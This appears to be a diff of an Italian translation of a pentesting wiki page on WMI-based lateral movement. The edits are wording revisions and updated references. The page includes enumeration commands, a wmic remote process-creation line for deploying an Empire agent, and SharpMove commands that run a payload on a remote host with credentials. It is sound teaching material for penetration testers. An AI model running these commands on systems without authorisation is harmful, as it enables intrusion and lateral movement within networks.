@@ -4,16 +4,16 @@
 
 ## Spiegazione del funzionamento
 
-I processi possono essere aperti sugli host per i quali sono noti il nome utente e la password o l'hash, tramite WMI. I comandi vengono eseguiti usando WMI tramite Wmiexec, offrendo un'esperienza simile a una shell semi-interattiva.
+I processi possono essere aperti sugli host di cui si conoscono il nome utente e la password o l'hash, utilizzando WMI. I comandi vengono eseguiti tramite WMI da Wmiexec, offrendo un'esperienza di shell semi-interattiva.
 
-**dcomexec.py:** Utilizzando diversi endpoint DCOM, questo script offre una shell semi-interattiva simile a wmiexec.py, sfruttando nello specifico l'oggetto DCOM ShellBrowserWindow. Attualmente supporta gli oggetti MMC20. Application, Shell Windows e Shell Browser Window. (fonte: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))<sup>[[2]](#references)</sup>
+**dcomexec.py:** Utilizzando diversi endpoint DCOM, questo script offre una shell semi-interattiva simile a `wmiexec.py`. Il valore `-object` selezionato sceglie l'endpoint; gli oggetti supportati includono `MMC20.Application`, `ShellWindows` e `ShellBrowserWindow`, con quest'ultimo che fornisce la tecnica Shell Browser Window evidenziata nella guida originale.<sup>[[2]](#references)[[3]](#references)</sup>
 
 ## Fondamenti di WMI
 
-### Spazio dei nomi
+### Namespace
 
-Strutturato secondo una gerarchia in stile directory, il contenitore di livello superiore di WMI è \root, sotto il quale sono organizzate directory aggiuntive, chiamate spazi dei nomi.<sup>[[1]](#references)</sup>
-Comandi per elencare gli spazi dei nomi:
+Strutturato in una gerarchia in stile directory, il contenitore di livello superiore di WMI è \root, al cui interno sono organizzate directory aggiuntive, denominate namespace.<sup>[[1]](#references)</sup>
+Comandi per elencare i namespace:
 ```bash
 # Retrieval of Root namespaces
 gwmi -namespace "root" -Class "__Namespace" | Select Name
@@ -31,7 +31,7 @@ gwmi -Namespace "root/microsoft" -List -Recurse
 ```
 ### **Classi**
 
-Conoscere il nome di una classe WMI, come win32_process, e il namespace in cui risiede è fondamentale per qualsiasi operazione WMI.
+Conoscere il nome di una classe WMI, come win32_process, e lo spazio dei nomi in cui risiede è fondamentale per qualsiasi operazione WMI.  
 Comandi per elencare le classi che iniziano con `win32`:
 ```bash
 Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
@@ -76,7 +76,7 @@ Raccolta di informazioni sul sistema e sui processi tramite WMI:
 Get-WmiObject -ClassName win32_operatingsystem | select * | more
 Get-WmiObject win32_process | Select Name, Processid
 ```
-Per gli attacker, WMI è uno strumento potente per enumerare dati sensibili sui sistemi o sui domini.<sup>[[1]](#references)</sup>
+Per gli attaccanti, WMI è uno strumento potente per enumerare dati sensibili relativi a sistemi o domini.<sup>[[1]](#references)</sup>
 ```bash
 wmic computerystem list full /format:list
 wmic process list /format:list
@@ -87,15 +87,15 @@ wmic sysaccount list /format:list
 ```
 L'interrogazione remota di WMI per ottenere informazioni specifiche, come gli amministratori locali o gli utenti connessi, è possibile con un'attenta costruzione dei comandi.
 
-### **Interrogazione manuale remota di WMI**
+### **Interrogazione manuale di WMI in remoto**
 
-L'identificazione stealth degli amministratori locali su una macchina remota e degli utenti connessi può essere ottenuta tramite query WMI specifiche. `wmic` supporta inoltre la lettura da un file di testo per eseguire comandi simultaneamente su più nodi.<sup>[[1]](#references)</sup>
+L'identificazione furtiva degli amministratori locali su una macchina remota e degli utenti connessi può essere ottenuta tramite query WMI specifiche. `wmic` supporta anche la lettura da un file di testo per eseguire comandi simultaneamente su più nodi.<sup>[[1]](#references)</sup>
 
 Per eseguire remotamente un processo tramite WMI, ad esempio per distribuire un agent Empire, viene utilizzata la seguente struttura di comando; l'esecuzione corretta è indicata da un valore restituito pari a "0":<sup>[[1]](#references)</sup>
 ```bash
 wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
 ```
-Questo processo illustra la capacità di WMI di eseguire comandi da remoto e enumerare i sistemi, evidenziandone l'utilità sia per l'amministrazione dei sistemi sia per il penetration testing.
+Questo processo illustra la capacità di WMI di eseguire operazioni da remoto e enumerare i sistemi, evidenziandone l'utilità sia per l'amministrazione dei sistemi sia per il penetration testing.
 
 ## Strumenti automatici
 
@@ -115,13 +115,12 @@ SharpMove.exe action=query computername=remote.host.local query="select * from w
 SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
 SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
 ```
-- Potresti anche usare **`wmiexec` di Impacket**.
+- Puoi anche utilizzare **`wmiexec` di Impacket**.
 
 
-## Riferimenti
+## References
 
-- [1] [Usare le credenziali per ottenere il controllo dei sistemi Windows - Parte 3 (WMI e WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
-- [2] [Guida per principianti al toolkit Impacket - Parte 1](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
-
-
+- [1] [Utilizzare le credenziali per ottenere il controllo dei sistemi Windows - Parte 3 (WMI e WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
+- [2] [Fortra Impacket - dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
+- [3] [Guida per principianti al toolkit Impacket, Parte 1 - Hacking Articles (Internet Archive)](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
 {{#include ../../banners/hacktricks-training.md}}
